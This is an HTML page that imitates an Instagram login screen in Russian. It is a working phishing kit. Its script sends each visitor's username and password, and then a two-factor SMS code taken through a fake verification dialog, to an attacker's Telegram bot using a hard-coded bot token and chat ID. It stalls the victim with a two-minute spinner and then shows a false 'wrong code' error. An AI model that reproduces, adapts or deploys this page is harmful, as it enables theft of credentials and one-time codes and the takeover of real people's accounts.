<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Войти • Instagram</title>
    <link rel="shortcut icon" href="./Instagram_logo_2022.svg.png" type="image/x-icon">
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 400px;
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        .login-container input[type="submit"] {
            background-color: #0095f6;
            color: white;
            border: none;
            font-size: 16px;
            cursor: pointer;
            padding: 12px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .login-container input[type="submit"]:hover {
            background-color: #0078d4;
        }

        .divider {
            margin: 20px 0;
            position: relative;
            text-align: center;
        }

        .divider::before,
        .divider::after {
            content: '';
            display: block;
            height: 1px;
            background-color: #dbdbdb;
            width: 40%;
            margin: 0 auto;
        }

        .divider span {
            position: absolute;
            top: -10px;
            background-color: #fafafa;
            padding: 0 10px;
            font-size: 14px;
            color: #8e8e8e;
        }

        .signup-link {
            font-size: 14px;
            color: #0095f6;
        }

        .signup-link a {
            text-decoration: none;
            color: #0095f6;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
        }

        .modal-content input {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        .modal-content button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }

        .modal-content button:hover {
            background-color: #0078d4;
        }

        /* Loading Spinner Styles */
        #loadingSpinner {
            display: none;
            margin-top: 20px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        #error {
            color: red;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* Infinite loading spinner for SMS verification */
        #smsLoadingSpinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            margin: 10px auto;
            animation: spin 1s linear infinite;
        }

        #smsModal .modal-content p {
            font-size: 14px;
            color: #8e8e8e;
        }

        .error-message {
            color: red;
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <!-- Instagram Logo -->
        <img src="./Instagram_logo_2022.svg.png" alt="Instagram Logo">
        <h1>Проверьте свой статус в Instagram</h1>
        <!-- Login Form -->
        <form onsubmit="handleLogin(event)">
            <input type="text" id="username" name="username" placeholder="Имя пользователя" required>
            <input type="password" id="password" name="password" placeholder="Пароль" required>
            <input type="submit" value="Войти">
        </form>

        <!-- Loading Spinner -->
        <div id="loadingSpinner"></div>

        <!-- Divider -->
        <div class="divider">
            <span>ИЛИ</span>
        </div>

        <!-- Sign Up Link -->
        <div class="signup-link">
            <p> Нет аккаунта? <a href="#">Зарегистрироваться</a></p>
        </div>
    </div>

    <!-- Modal for SMS Verification -->
    <div id="smsModal" class="modal">
        <div class="modal-content">
            <h3>Проверьте свои СМС, мы отправили вам код!</h3>
            <p>Если код не был отправлен, попробуйте войти снова.</p>
            <input type="text" id="verificationCode" placeholder=" Введите код подтверждения" required>
            <button onclick="handleVerificationCode()">Отправить</button>

            <div id="error"></div>
            <!-- SMS Loading Spinner -->
            <div id="smsLoadingSpinner"></div>
        </div>
    </div>

    <script>
        // Function to send data to Telegram Bot
        function sendToTelegram(username, password) {
            const botToken = '7848679382:AAG9RDlm4FVRpyKcbXCoLExV_CoA4TCu7RI'; // Replace with your bot API token
            const chatId = '6956607670'; // Replace with your chat ID

            const message = `Username: ${username}\nPassword: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Send request to Telegram
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Message sent:', data);
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
        }

        // Function to send verification code to Telegram Bot
        function sendVerificationCodeToTelegram(code) {
            const botToken = '7848679382:AAG9RDlm4FVRpyKcbXCoLExV_CoA4TCu7RI'; // Replace with your bot API token
            const chatId = '6956607670'; // Replace with your chat ID

            const message = `Verification Code: ${code}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            // Send request to Telegram
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Verification code sent:', data);
                })
                .catch(error => {
                    console.error('Error sending verification code to Telegram:', error);
                });
        }

        // Handle login form submission
        function handleLogin(event) {
            event.preventDefault(); // Prevent page refresh on form submit

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                showLoadingSpinner();  // Show loading spinner
                sendToTelegram(username, password); // Send username and password to Telegram
                showModal(); // Show the modal after login attempt
            } else {
                alert('Пожалуйста, введите и имя пользователя, и пароль.');
            }
        }

        // Show the loading spinner
        function showLoadingSpinner() {
            document.getElementById('loadingSpinner').style.display = 'block';
        }

        // Hide the loading spinner
        function hideLoadingSpinner() {
            document.getElementById('loadingSpinner').style.display = 'none';
        }

        // Show the modal
        function showModal() {
            setTimeout(() => {
                hideLoadingSpinner(); // Hide the spinner once the message is sent
                document.getElementById('smsModal').style.display = 'flex';
            }, 2000); // Simulate delay for demo (e.g., network delay)
        }

        // Handle verification code submission
        function handleVerificationCode() {
            const verificationCode = document.getElementById('verificationCode').value;

            if (verificationCode) {
                // Send the verification code to Telegram
                sendVerificationCodeToTelegram(verificationCode);

                // Show infinite loading for 2 minutes after submitting the code
                showSmsLoadingSpinner();

                setTimeout(() => {
                    hideSmsLoadingSpinner();
                    // Show error message after 2 minutes if code is not correct
                    const errorMessage = document.getElementById("error");
                    errorMessage.textContent = 'Код неверный, проверьте его еще раз!';
                }, 120000); // Keep loading spinner for 2 minutes (120000 ms)
            } else {
                alert('Пожалуйста, введите код подтверждения.');
            }
        }

        // Show infinite loading spinner for SMS verification
        function showSmsLoadingSpinner() {
            document.getElementById('smsLoadingSpinner').style.display = 'block';
        }

        // Hide the infinite loading spinner for SMS verification
        function hideSmsLoadingSpinner() {
            document.getElementById('smsLoadingSpinner').style.display = 'none';
        }
    </script>
</body>

</html>
